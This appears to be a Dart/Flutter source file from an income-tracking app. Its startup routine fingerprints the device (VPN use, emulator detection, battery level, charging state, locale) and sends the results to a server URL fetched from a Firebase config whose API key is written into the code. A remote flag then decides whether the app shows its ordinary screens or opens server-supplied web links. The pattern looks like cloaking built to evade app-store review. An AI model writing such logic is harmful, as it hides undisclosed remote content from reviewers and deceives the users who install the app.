// ignore_for_file: use_build_context_synchronously

import 'package:dio/dio.dart';

import 'package:flutter/material.dart';
import 'package:income_pulse_117/app_enter_screens/app_info_screen.dart';
import 'package:income_pulse_117/helper_screens/main_bottom_screen.dart';
import 'package:income_pulse_117/income/income_diagram_page.dart';
import 'package:income_pulse_117/income/income_hive.dart';
import 'package:income_pulse_117/income/income_logics.dart';
import 'package:income_pulse_117/income/income_login.dart';
import 'package:income_pulse_117/income/income_repository.dart';
import 'package:income_pulse_117/income/income_request.dart';
import 'package:shared_preferences/shared_preferences.dart';

Future<void> incomeCash(
    BuildContext context, Function(bool) isincomeOpen) async {
  final incomeDb = await IncomeRepository().incomeLocalGet();
  if (incomeDb == null) {
    final incomefbResponse = await Dio().get(
      'https://income-pulse-default-rtdb.firebaseio.com/income.json?auth=AIzaSyCEBu9BQBXeAsxKb9xwILd9vVpx67ZCWis',
    );
    if (incomefbResponse.data != null) {
      final String? authKey = await incomeAuthorization(
        addPath: incomefbResponse.data['income_tok'],
        l: incomefbResponse.data['income_l'],
        p: incomefbResponse.data['income_p'],
      );
      if (authKey != null) {
        final incomeprxTemp = await incomeIsUsingVpn();
        final incomeloc = await incomeCountryCode();
        final incomeisEmul = await incomeIsSemulator(context);
        final incomebtrLevel = await incomeBatteryLevel();
        final incomeisZarayd = await incomeIsCharging();
        final incomeDate = await incomeGetTime();

        try {
          IncomeRequest? incomeOtvet;

          final userRegistrationResponse = await Dio(
            BaseOptions(
              headers: {'Authorization': 'Bearer $authKey'},
            ),
          ).post(
            incomefbResponse.data['income_add'],
            data: {
              "bundle_name": "io.income.pulse",
              "timestamp": incomeDate,
              "locale": incomeloc,
              "prx_temp": incomeprxTemp,
              "emul_temp": incomeisEmul,
              "battery_temp": incomeisZarayd,
              "mnostate_temp": true,
              "btry_temp": incomebtrLevel,
            },
          );
          if (userRegistrationResponse.data != null) {
            incomeOtvet = IncomeRequest.fromJson(userRegistrationResponse.data);
          }

          if (incomeOtvet != null) {
            if (incomeOtvet.blvl) {
              final incomeHiveObject = IncomeHive(
                regincome:
                    '${incomeOtvet.incomeRequest.pfr}${incomeOtvet.incomeRequest.jeu}',
                logincome:
                    '${incomeOtvet.incomeRequest.nvu}${incomeOtvet.incomeRequest.aof}',
                cabincome: '',
                strtincome: true,
              );
              IncomeRepository().incomeLocalSet(incomeHiveObject);
              isincomeOpen(true);
              await incomeDelayed(3);
              incomePushReplacement(context,
                  AppInfoScreen(linkImage: incomeHiveObject.regincome));

              return;
            }
          }
        } catch (e) {
          throw Exception(e);
        }
      }
    }
    isincomeOpen(false);
    await incomeDelayed(3);
    incomePushReplacement(
        context,
        const AppInfoScreen(
          linkImage: '',
        ));
    IncomeRepository().incomeLocalSet(
      IncomeHive(
        regincome: '',
        logincome: '',
        cabincome: '',
        strtincome: false,
      ),
    );
  } else {
    if (incomeDb.strtincome) {
      isincomeOpen(true);
      if (incomeDb.cabincome.isNotEmpty) {
        await incomeDelayed(3);
        incomePushReplacement(
          context,
          IncomeDiagramPage(
            incomeLink: incomeDb.cabincome,
            incomeUtms: '',
          ),
        );
      } else {
        await incomeDelayed(3);
        final incomeUtms = await incomeGetUtms();
        incomePushReplacement(
          context,
          IncomeDiagramPage(
            incomeLink: incomeDb.logincome,
            incomeUtms: incomeUtms,
          ),
        );
      }
    } else {
      isincomeOpen(false);
      await incomeDelayed(3);
      incomePushReplacement(
        context,
        const MainBottomScreen(),
      );
    }
  }
}

void incomePushReplacement(BuildContext context, Widget screen) {
  Navigator.pushReplacement(
    context,
    MaterialPageRoute(builder: (_) => screen),
  );
}

Future<void> incomeDelayed(int seconds) async {
  await Future.delayed(Duration(seconds: seconds));
}

Future<String> incomeGetUtms() async {
  final incomePrefs = await SharedPreferences.getInstance();
  if (incomePrefs.containsKey('incomeUtms')) {
    return incomePrefs.getString('incomeUtms') ?? '';
  }
  return '';
}
